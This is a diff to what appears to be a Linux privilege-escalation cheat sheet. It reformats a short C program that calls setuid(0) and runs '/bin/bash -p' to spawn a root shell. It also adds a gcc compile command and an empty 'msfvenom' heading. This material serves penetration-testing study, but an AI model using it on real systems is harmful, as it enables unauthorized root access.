@@ -57,10 +57,17 @@ A root shell can be spawned by simply executing the rootbash file with the -p co
 ##### Custom Executables
 
 There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:  
+```
 int main() { 
 	setuid(0); 
-	system("/bin/bash -p"); } 
-$ gcc -o
+	system("/bin/bash -p"); 
+} 
+
+Compile using:
+$ gcc -o <name> <filename.c>
+```
+
+##### msfvenom
 
 
 ### References
